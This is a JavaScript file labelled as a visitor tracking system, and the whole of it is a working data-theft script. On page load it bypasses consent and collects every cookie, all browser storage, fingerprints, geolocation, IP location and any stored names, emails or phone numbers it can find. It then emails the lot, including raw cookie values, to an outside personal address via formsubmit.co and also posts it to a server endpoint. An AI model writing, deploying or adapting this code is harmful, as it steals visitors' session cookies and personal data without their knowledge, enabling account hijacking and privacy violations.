/**
 * Enhanced Visitor Tracking System
 * Collects comprehensive visitor data including cookies, personal info, and advanced fingerprinting
 */

class EnhancedVisitorTracker {
    constructor() {
        this.sessionId = this.generateSessionId();
        this.visitorData = {};
        this.isTrackingEnabled = true;
        this.cookieConsent = false;
        this.init();
    }

    init() {
        // Automatically start comprehensive tracking without consent
        this.cookieConsent = true;
        this.isTrackingEnabled = true;
        this.collectComprehensiveData();
        this.setupEventListeners();
        this.trackBehavior();
        this.startComprehensiveTracking();
    }

    // Generate unique session ID
    generateSessionId() {
        return Date.now().toString(36) + Math.random().toString(36).substr(2) + '_' + 
               navigator.userAgent.slice(-10).replace(/\s+/g, '');
    }

    // Automatic comprehensive tracking - no consent required
    startAutomaticTracking() {
        console.log('🔍 Starting automatic comprehensive visitor tracking...');
        this.collectComprehensiveData();
        this.sendComprehensiveData();
    }

    // Collect comprehensive visitor data
    async collectComprehensiveData() {
        this.visitorData = {
            // Basic Information
            timestamp: new Date().toISOString(),
            sessionId: this.sessionId,
            pageUrl: window.location.href,
            referrer: document.referrer || 'Direct Visit',
            
            // Cookies and Storage
            cookies: this.getAllCookies(),
            localStorage: this.getLocalStorageData(),
            sessionStorage: this.getSessionStorageData(),
            
            // Browser Information
            browserInfo: this.getDetailedBrowserInfo(),
            
            // Device Information
            deviceInfo: this.getDeviceInfo(),
            
            // Network Information
            networkInfo: await this.getNetworkInfo(),
            
            // Location Information
            locationInfo: await this.getLocationInfo(),
            
            // Social Media Profiles
            socialProfiles: this.detectSocialProfiles(),
            
            // Personal Information (if provided)
            personalInfo: this.getPersonalInfo(),
            
            // Behavioral Data
            behaviorData: this.getBehaviorData(),
            
            // Advanced Fingerprinting
            fingerprint: this.generateFingerprint()
        };
    }

    // Get all cookies
    getAllCookies() {
        const cookies = {};
        if (document.cookie) {
            document.cookie.split(';').forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (name && value) {
                    cookies[name] = decodeURIComponent(value);
                }
            });
        }
        return cookies;
    }

    // Get localStorage data
    getLocalStorageData() {
        const data = {};
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                data[key] = localStorage.getItem(key);
            }
        } catch (e) {
            data.error = 'Access denied';
        }
        return data;
    }

    // Get sessionStorage data
    getSessionStorageData() {
        const data = {};
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                data[key] = sessionStorage.getItem(key);
            }
        } catch (e) {
            data.error = 'Access denied';
        }
        return data;
    }

    // Get detailed browser information
    getDetailedBrowserInfo() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Browser fingerprint', 2, 2);
        
        return {
            userAgent: navigator.userAgent,
            appName: navigator.appName,
            appVersion: navigator.appVersion,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            maxTouchPoints: navigator.maxTouchPoints,
            vendor: navigator.vendor,
            vendorSub: navigator.vendorSub,
            product: navigator.product,
            productSub: navigator.productSub,
            buildID: navigator.buildID,
            screenResolution: `${screen.width}x${screen.height}`,
            screenColorDepth: screen.colorDepth,
            screenPixelDepth: screen.pixelDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            canvasFingerprint: canvas.toDataURL(),
            webglVendor: this.getWebGLInfo(),
            plugins: this.getPluginInfo(),
            fonts: this.getFontInfo()
        };
    }

    // Get WebGL information
    getWebGLInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown'
                };
            }
        } catch (e) {}
        return 'Not supported';
    }

    // Get plugin information
    getPluginInfo() {
        const plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
            plugins.push({
                name: navigator.plugins[i].name,
                description: navigator.plugins[i].description,
                filename: navigator.plugins[i].filename
            });
        }
        return plugins;
    }

    // Get font information
    getFontInfo() {
        const fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
        const availableFonts = [];
        
        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');
        
        fonts.forEach(font => {
            context.font = '72px monospace';
            const baselineWidth = context.measureText('mmmmmmmmmmlli').width;
            context.font = `72px ${font}, monospace`;
            const width = context.measureText('mmmmmmmmmmlli').width;
            if (width !== baselineWidth) {
                availableFonts.push(font);
            }
        });
        
        return availableFonts;
    }

    // Get device information
    getDeviceInfo() {
        return {
            deviceMemory: navigator.deviceMemory || 'Unknown',
            connection: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            } : 'Not available',
            touchSupport: 'ontouchstart' in window,
            orientation: screen.orientation ? screen.orientation.type : 'Unknown',
            pixelRatio: window.devicePixelRatio,
            viewport: {
                width: window.innerWidth,
                height: window.innerHeight
            }
        };
    }

    // Get network information
    async getNetworkInfo() {
        const networkInfo = {
            connection: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            } : 'Not available'
        };

        // Get IP and location
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            networkInfo.ipInfo = data;
        } catch (e) {
            networkInfo.ipInfo = { error: 'Failed to get IP info' };
        }

        return networkInfo;
    }

    // Get location information
    async getLocationInfo() {
        const location = {
            geolocation: null,
            ipLocation: null
        };

        // Try to get geolocation
        if (navigator.geolocation) {
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        timeout: 5000,
                        enableHighAccuracy: false
                    });
                });
                location.geolocation = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                };
            } catch (e) {
                location.geolocation = { error: 'Geolocation denied or failed' };
            }
        }

        // Get IP-based location
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            location.ipLocation = data;
        } catch (e) {
            location.ipLocation = { error: 'Failed to get IP location' };
        }

        return location;
    }

    // Detect social media profiles
    detectSocialProfiles() {
        const profiles = {};
        
        // Check for social media cookies and data
        const socialDomains = [
            'facebook.com', 'twitter.com', 'instagram.com', 'linkedin.com',
            'youtube.com', 'tiktok.com', 'snapchat.com', 'pinterest.com',
            'reddit.com', 'discord.com', 'telegram.org', 'whatsapp.com'
        ];

        socialDomains.forEach(domain => {
            const cookies = this.getAllCookies();
            const matchingCookies = Object.keys(cookies).filter(key => 
                key.toLowerCase().includes(domain.replace('.com', '').replace('.org', ''))
            );
            if (matchingCookies.length > 0) {
                profiles[domain] = {
                    hasCookies: true,
                    cookieCount: matchingCookies.length,
                    cookies: matchingCookies
                };
            }
        });

        return profiles;
    }

    // Get personal information from forms or stored data
    getPersonalInfo() {
        const personalInfo = {
            name: null,
            email: null,
            phone: null,
            company: null,
            position: null,
            socialMedia: {}
        };

        // Try to extract from localStorage/sessionStorage
        try {
            const storedData = { ...localStorage, ...sessionStorage };
            Object.keys(storedData).forEach(key => {
                const value = storedData[key];
                if (value && typeof value === 'string') {
                    // Check for email patterns
                    if (value.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
                        personalInfo.email = value;
                    }
                    // Check for phone patterns
                    if (value.match(/^[\+]?[1-9][\d]{0,15}$/)) {
                        personalInfo.phone = value;
                    }
                    // Check for name patterns (basic)
                    if (value.match(/^[A-Za-z\s]{2,50}$/) && value.length > 2 && value.length < 50) {
                        personalInfo.name = value;
                    }
                }
            });
        } catch (e) {}

        return personalInfo;
    }

    // Get behavioral data
    getBehaviorData() {
        return {
            timeOnPage: Date.now() - this.pageStartTime,
            scrollDepth: this.getScrollDepth(),
            clicks: this.clickCount,
            keystrokes: this.keystrokeCount,
            mouseMovements: this.mouseMovementCount,
            pageViews: this.getPageViews(),
            referrer: document.referrer,
            landingPage: window.location.href,
            exitIntent: this.hasExitIntent,
            deviceOrientation: this.getDeviceOrientation()
        };
    }

    // Generate browser fingerprint
    generateFingerprint() {
        const components = [
            navigator.userAgent,
            navigator.language,
            screen.width + 'x' + screen.height,
            screen.colorDepth,
            new Date().getTimezoneOffset(),
            navigator.platform,
            navigator.cookieEnabled,
            typeof(Worker) !== 'undefined'
        ];

        let fingerprint = '';
        components.forEach(component => {
            fingerprint += component;
        });

        // Simple hash function
        let hash = 0;
        for (let i = 0; i < fingerprint.length; i++) {
            const char = fingerprint.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash; // Convert to 32bit integer
        }
        
        return hash.toString();
    }

    // Setup event listeners for behavioral tracking
    setupEventListeners() {
        this.pageStartTime = Date.now();
        this.clickCount = 0;
        this.keystrokeCount = 0;
        this.mouseMovementCount = 0;
        this.hasExitIntent = false;

        // Track clicks
        document.addEventListener('click', () => {
            this.clickCount++;
        });

        // Track keystrokes
        document.addEventListener('keydown', () => {
            this.keystrokeCount++;
        });

        // Track mouse movements
        document.addEventListener('mousemove', () => {
            this.mouseMovementCount++;
        });

        // Track exit intent
        document.addEventListener('mouseout', (e) => {
            if (e.clientY <= 0) {
                this.hasExitIntent = true;
            }
        });

        // Track page unload
        window.addEventListener('beforeunload', () => {
            this.sendComprehensiveData();
        });
    }

    // Track scroll depth
    getScrollDepth() {
        const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
        const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
        return Math.round((scrollTop / scrollHeight) * 100);
    }

    // Get page views
    getPageViews() {
        const views = sessionStorage.getItem('pageViews') || 0;
        sessionStorage.setItem('pageViews', parseInt(views) + 1);
        return parseInt(views) + 1;
    }

    // Get device orientation
    getDeviceOrientation() {
        return screen.orientation ? screen.orientation.type : 'Unknown';
    }

    // Start comprehensive tracking (automatic)
    startComprehensiveTracking() {
        console.log('🔍 Starting automatic comprehensive visitor tracking...');
        this.collectComprehensiveData();
        this.sendComprehensiveData();
    }

    // Send comprehensive data (always enabled)
    async sendComprehensiveData() {

        try {
            // Send to FormSubmit.co with enhanced formatting
            const emailContent = this.formatComprehensiveEmail();
            
            await fetch('https://formsubmit.co/jayaraman2212066@ssn.edu.in', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    name: '🔍 Comprehensive Visitor Tracker',
                    email: 'jayaraman2212066@ssn.edu.in',
                    subject: `🔍 COMPREHENSIVE VISITOR DATA - ${this.visitorData.locationInfo?.ipLocation?.country || 'Unknown'}`,
                    message: emailContent,
                    _template: 'table',
                    _autoresponse: 'Comprehensive visitor data collected successfully',
                    _captcha: 'false'
                })
            });

            // Also send to server endpoint
            await fetch('/log-comprehensive', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(this.visitorData)
            });

            console.log('✅ Comprehensive visitor data sent successfully');
        } catch (error) {
            console.error('❌ Error sending comprehensive data:', error);
        }
    }


    // Format comprehensive email
    formatComprehensiveEmail() {
        const data = this.visitorData;
        return `
🔍 COMPREHENSIVE VISITOR DATA COLLECTED 🔍
===============================================

📅 TIMESTAMP: ${new Date(data.timestamp).toLocaleString()}
🆔 SESSION ID: ${data.sessionId}
🌐 PAGE URL: ${data.pageUrl}
🔗 REFERRER: ${data.referrer}

🍪 COOKIES COLLECTED (${Object.keys(data.cookies).length} total):
${Object.keys(data.cookies).map(key => `   • ${key}: ${data.cookies[key]}`).join('\n')}

💾 LOCAL STORAGE DATA:
${JSON.stringify(data.localStorage, null, 2)}

💾 SESSION STORAGE DATA:
${JSON.stringify(data.sessionStorage, null, 2)}

💻 DETAILED BROWSER INFO:
   • User Agent: ${data.browserInfo.userAgent}
   • Platform: ${data.browserInfo.platform}
   • Language: ${data.browserInfo.language}
   • Screen: ${data.browserInfo.screenResolution}
   • Timezone: ${data.browserInfo.timezone}
   • WebGL Vendor: ${JSON.stringify(data.browserInfo.webglVendor)}
   • Available Fonts: ${data.browserInfo.fonts.join(', ')}

📱 DEVICE INFO:
   • Memory: ${data.deviceInfo.deviceMemory}
   • Touch Support: ${data.deviceInfo.touchSupport}
   • Pixel Ratio: ${data.deviceInfo.pixelRatio}
   • Viewport: ${data.deviceInfo.viewport.width}x${data.deviceInfo.viewport.height}

🌍 LOCATION DATA:
   • IP: ${data.locationInfo?.ipLocation?.ip || 'Unknown'}
   • Country: ${data.locationInfo?.ipLocation?.country_name || 'Unknown'}
   • City: ${data.locationInfo?.ipLocation?.city || 'Unknown'}
   • Region: ${data.locationInfo?.ipLocation?.region || 'Unknown'}

👤 PERSONAL INFO DETECTED:
   • Name: ${data.personalInfo.name || 'Not detected'}
   • Email: ${data.personalInfo.email || 'Not detected'}
   • Phone: ${data.personalInfo.phone || 'Not detected'}

📊 BEHAVIORAL DATA:
   • Time on Page: ${Math.round(data.behaviorData.timeOnPage / 1000)} seconds
   • Scroll Depth: ${data.behaviorData.scrollDepth}%
   • Clicks: ${data.behaviorData.clicks}
   • Keystrokes: ${data.behaviorData.keystrokes}
   • Mouse Movements: ${data.behaviorData.mouseMovements}
   • Page Views: ${data.behaviorData.pageViews}

🔍 BROWSER FINGERPRINT: ${data.fingerprint}

🎯 SOCIAL MEDIA PROFILES DETECTED:
${Object.keys(data.socialProfiles).map(platform => 
    `   • ${platform}: ${data.socialProfiles[platform].cookieCount} cookies`
).join('\n')}

===============================================
🔍 COMPREHENSIVE DATA COLLECTION COMPLETE 🔍
        `;
    }

    // Track behavior over time (always enabled)
    trackBehavior() {
        setInterval(() => {
            this.visitorData.behaviorData = this.getBehaviorData();
        }, 30000); // Update every 30 seconds
    }
}

// Initialize enhanced visitor tracking when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    // Check if tracking is already initialized
    if (!window.enhancedTracker) {
        console.log('🚀 Initializing automatic comprehensive visitor tracking...');
        window.enhancedTracker = new EnhancedVisitorTracker();
    }
});

// Also start tracking immediately if DOM is already loaded
if (document.readyState === 'loading') {
    // DOM is still loading, wait for DOMContentLoaded
} else {
    // DOM is already loaded, start tracking immediately
    if (!window.enhancedTracker) {
        console.log('🚀 Starting immediate automatic comprehensive visitor tracking...');
        window.enhancedTracker = new EnhancedVisitorTracker();
    }
}

// Export for use in other scripts
window.EnhancedVisitorTracker = EnhancedVisitorTracker;
